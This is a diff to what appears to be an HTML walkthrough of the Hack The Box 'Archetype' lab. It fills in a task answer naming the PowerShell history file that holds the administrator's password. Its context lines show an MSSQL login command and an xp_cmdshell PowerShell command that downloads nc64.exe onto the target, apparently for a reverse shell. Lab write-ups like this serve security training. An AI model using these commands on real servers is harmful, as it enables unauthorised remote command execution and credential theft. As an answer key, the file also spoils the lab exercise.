@@ -40,7 +40,7 @@ A：<code>WinPEAS</code><br><br>
 
 <h3>TASK 7</h3>
 Q：What file contains the administrator's password?<br>
-A：<code></code><br>
+A：<code>ConsoleHost_history.txt</code><br>
 <code>python3 mssqlclient.py ARCHETYPE/sql_svc:&lt;passwd&gt;@&lt;TARGET IP&gt; -windows-auth</code><br><br>
 <code>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://&lt;TARGET IP&gt/nc64.exe -outfile nc64.exe"</code>
 
